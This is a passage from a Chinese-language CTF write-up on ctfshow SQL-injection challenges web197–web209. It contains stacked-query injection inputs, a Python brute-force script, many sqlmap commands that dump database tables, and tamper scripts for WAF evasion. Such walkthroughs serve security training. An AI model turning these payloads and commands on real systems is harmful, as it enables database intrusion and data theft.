</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="c1">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="s1">&#39;/\*|\#|\-|\x23|\&#39;|\&#34;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;用户名非法&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;登陆成功 flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">      
</span></span></code></pre></div><p>这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可</p>
<p>比如</p>
<pre tabindex="0"><code>username: 1;show tables 
password: ctfshow_user
</code></pre><p>其他的一些骚操作</p>
<p>重写ctfshow_user表</p>
<p><img alt="image-20250210001411101" loading="lazy" src="../assets/image-20250210001411101.png"></p>
<p>把密码和id列互换之后爆密码（实际上在爆id）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                        <span class="s1">&#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">                        <span class="s1">&#39;varchar(255);&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0x61646d696e&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;登陆成功&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><h4 id="web198">web198<a hidden class="anchor" aria-hidden="true" href="#web198">#</a></h4>
<p>同web197</p>
<h4 id="web199">web199<a hidden class="anchor" aria-hidden="true" href="#web199">#</a></h4>
<p>通解一把梭</p>
<h4 id="web200">web200<a hidden class="anchor" aria-hidden="true" href="#web200">#</a></h4>
<p>通解一把梭</p>
<h4 id="web190-web200通解">web190-web200通解<a hidden class="anchor" aria-hidden="true" href="#web190-web200通解">#</a></h4>
<pre tabindex="0"><code>username=0;show tables;
pass=ctfshow_user
</code></pre><h4 id="sqlmap的使用">sqlmap的使用<a hidden class="anchor" aria-hidden="true" href="#sqlmap的使用">#</a></h4>
<h4 id="web201">web201<a hidden class="anchor" aria-hidden="true" href="#web201">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载
 使用--user-agent 指定agent
 使用--referer 绕过referer检查
</code></pre><pre tabindex="0"><code>检测注入类型
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show

爆数据库
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs

爆表
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web --tables 

爆列
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web -T ctfshow_user --columns

爆值
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web202">web202<a hidden class="anchor" aria-hidden="true" href="#web202">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载

 使用--data 调整sqlmap的请求方式
</code></pre><pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>通过向命令行加入&ndash;data参数转化请求方式为post</p>
<pre tabindex="0"><code>sqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data &#39;id=1&#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web203">web203<a hidden class="anchor" aria-hidden="true" href="#web203">#</a></h4>
<pre tabindex="0"><code> sqlmap最新版下载
 使用--method 调整sqlmap的请求方式
</code></pre><pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>&ndash;headers=&ldquo;Content-Type: text/plain&rdquo; 以表单形式发送</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; -D ctfshow_web -T ctfshow_user -C pass --dump 
</code></pre><h4 id="web204">web204<a hidden class="anchor" aria-hidden="true" href="#web204">#</a></h4>
<pre tabindex="0"><code>使用--cookie 提交cookie数据
</code></pre><p>payload:</p>
<pre tabindex="0"><code> sqlmap -u &#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917
6f63d87074e926a342a996872&#34; -D ctfshow_web -T ctfshow_user -C pass --dump
</code></pre><h4 id="web205">web205<a hidden class="anchor" aria-hidden="true" href="#web205">#</a></h4>
<pre tabindex="0"><code>api调用需要鉴权
</code></pre><p>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code></p>
<p><img alt="image-20250213112654599" loading="lazy" src="../assets/image-20250213112654599.png"></p>
<p>payload：</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=60prkqe8189934t5pv3ikepa16&#34; --safe-url=&#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump
</code></pre><h4 id="web206">web206<a hidden class="anchor" aria-hidden="true" href="#web206">#</a></h4>
<pre tabindex="0"><code> sql需要闭合
</code></pre><pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
</code></pre><p>sqlmap会自动构造闭合，所以跟前一题没什么区别</p>
<p>但是也可以手动构造一下</p>
<p>payload:</p>
<pre tabindex="0"><code>根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=&#34;)#&#34;
执行sqlmap命令行
sqlmap -u &#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;&#34; --safe-url=&#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; --dbs

sqlmap -u &#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;&#34; --safe-url=&#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; -D ctfshow_web --tables

sqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=&#34;id=1&#34; --referer=ctf.show --dbms=mysql -D &#34;ctfshow_web&#34; -T &#34;ctfshow_flaxc&#34; -C &#34;flagv&#34; --dump  --headers=&#34;Content-Type: text/plain&#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 
</code></pre><h4 id="web207">web207<a hidden class="anchor" aria-hidden="true" href="#web207">#</a></h4>
<p><a href="https://y4er.com/post/sqlmap-tamper/">Sqlmap Tamper 编写</a></p>
<p>示例</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">See the file &#39;doc/COPYING&#39; for copying permission
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span> <span class="c1"># 当前脚本调用优先等级</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span> <span class="c1"># 声明当前脚本适用/不适用的范围，可以为空。</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span> <span class="c1"># 用于篡改Payload、以及请求头的主要函数</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span></code></pre></div><p>题目</p>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   return preg_match(&#39;/ /&#39;, $str);
  }
</code></pre><p>这里会将waf中的关键词替换成空格</p>
<p>放一个Y4tacker大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># 假设在Python 3环境中运行，将xrange替换为range</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># 从lib.core.enums模块中导入PRIORITY枚举类型</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># 设置脚本的优先级为低</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s2">    篡改函数，调用space2comment函数对有效负载进行处理
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">    :param payload: 待处理的有效负载
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">    :param kwargs: 其他关键字参数
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s2">    :return: 处理后的有效负载
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s2">    将有效负载中的空格字符替换为换行符
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s2">    :param payload: 待处理的有效负载
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s2">    :return: 处理后的有效负载
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="c1"># 用于跟踪是否在单引号内</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">quote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="c1"># 用于跟踪是否在双引号内</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">doublequote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="c1"># 用于跟踪是否遇到第一个空格</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">                <span class="c1"># 取反quote的值</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">                <span class="c1"># 取反doublequote的值</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">
</span></span><span class="line"><span class="ln">54</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>其实这段代码的目的就是将payload中的空格替换成换行符</p>
<p>其实直接用sqlmap自带的sapce2comment模板</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump
</code></pre><h4 id="web208">web208<a hidden class="anchor" aria-hidden="true" href="#web208">#</a></h4>
<p>同上一题</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump
</code></pre><h4 id="web209">web209<a hidden class="anchor" aria-hidden="true" href="#web209">#</a></h4>
<p>这题新增了点waf</p>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match(&#39;/ |\*|\=/&#39;, $str);
  }
</code></pre><p>Y4tacker大佬的tamper</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.compat</span> <span class="kn">import</span> <span class="n">xrange</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
